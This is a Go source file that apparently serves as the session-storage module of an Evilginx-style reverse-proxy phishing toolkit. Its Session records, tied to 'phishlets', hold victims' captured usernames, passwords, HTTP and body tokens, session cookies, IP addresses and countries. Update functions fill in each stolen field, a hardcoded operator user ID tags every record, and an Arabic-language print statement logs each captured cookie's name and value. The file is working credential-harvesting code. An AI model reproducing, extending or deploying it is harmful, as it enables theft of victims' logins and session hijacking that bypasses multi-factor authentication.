package database

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/tidwall/buntdb"
)

// UserConfig holds the user configuration data
type UserConfig struct {
	UserId string `json:"user_id"`
}

// GetUserId reads the user_id from userConfig.json
func GetUserId() string {
	// Default user ID in case we can't read the file
	defaultUserId := "jemex12345"
	
	// Try to find userConfig.json in current directory or up to 2 parent directories
	configFile := "userConfig.json"
	configPaths := []string{
		configFile,
		filepath.Join("..", configFile),
		filepath.Join("..", "..", configFile),
	}
	
	var configData []byte
	var err error
	
	for _, path := range configPaths {
		configData, err = os.ReadFile(path)
		if err == nil {
			break
		}
	}
	
	if err != nil {
		return defaultUserId
	}
	
	// Parse the config file
	var config struct {
		UserId string `json:"user_id"`
	}
	
	err = json.Unmarshal(configData, &config)
	if err != nil || config.UserId == "" {
		return defaultUserId
	}
	
	return config.UserId
}

const SessionTable = "sessions"

type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
	Cookies      []map[string]interface{}           `json:"cookies"`
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
	UserId       string                             `json:"user_id"`
	CountryCode  string                             `json:"country_code"`
	Country      string                             `json:"country"`
}

type CookieToken struct {
	Name             string
	Value            string
	Path             string
	HttpOnly         bool
	ExpirationDate   int64 // Expiration as unix timestamp
}

func (d *Database) sessionsInit() {
	d.db.CreateIndex("sessions_id", SessionTable+":*", buntdb.IndexJSON("id"))
	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
}

func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
	_, err := d.sessionsGetBySid(sid)
	if err == nil {
		return nil, fmt.Errorf("session already exists: %s", sid)
	}

	id, _ := d.getNextId(SessionTable)

	s := &Session{
		Id:           id,
		Phishlet:     phishlet,
		LandingURL:   landing_url,
		Username:     "",
		Password:     "",
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*CookieToken),
		Cookies:      []map[string]interface{}{},
		SessionId:    sid,
		UserAgent:    useragent,
		RemoteAddr:   remote_addr,
		CreateTime:   time.Now().UTC().Unix(),
		UpdateTime:   time.Now().UTC().Unix(),
		UserId:       GetUserId(),
		CountryCode:  "",
		Country:      "",
	}

	jf, _ := json.Marshal(s)

	err = d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

func (d *Database) sessionsList() ([]*Session, error) {
	sessions := []*Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		tx.Ascend("sessions_id", func(key, val string) bool {
			s := &Session{}
			if err := json.Unmarshal([]byte(val), s); err == nil {
				sessions = append(sessions, s)
			}
			return true
		})
		return nil
	})
	if err != nil {
		return nil, err
	}
	return sessions, nil
}

func (d *Database) sessionsUpdateUsername(sid string, username string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Username = username
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdatePassword(sid string, password string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Password = password
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateCustom(sid string, name string, value string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Custom[name] = value
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateBodyTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.BodyTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateHttpTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.HttpTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	
	if len(tokens) > 0 {
		domain := ""
		name := ""
		value := ""
		
		for d, ts := range tokens {
			domain = d
			for n, t := range ts {
				name = n
				value = t.Value
				break
			}
			break
		}
		
		fmt.Printf("تحديث الكوكيز في قاعدة البيانات: %s -> المجال: %s, الاسم: %s, القيمة: %s (%d domains)\n", 
			sid, domain, name, value, len(tokens))
	}
	
	s.CookieTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateCountryInfo(sid string, countryCode string, country string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	
	s.CountryCode = countryCode
	s.Country = country
	s.UpdateTime = time.Now().UTC().Unix()
	
	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateCookies(sid string, cookies []map[string]interface{}) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	
	s.Cookies = cookies
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdate(id int, s *Session) error {
	jf, _ := json.Marshal(s)

	err := d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	return err
}

func (d *Database) sessionsDelete(id int) error {
	err := d.db.Update(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(d.genIndex(SessionTable, id))
		return err
	})
	return err
}

func (d *Database) sessionsGetById(id int) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_id", d.getPivot(map[string]int{"id": id}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session ID not found: %d", id)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_sid", d.getPivot(map[string]string{"session_id": sid}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session not found: %s", sid)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}
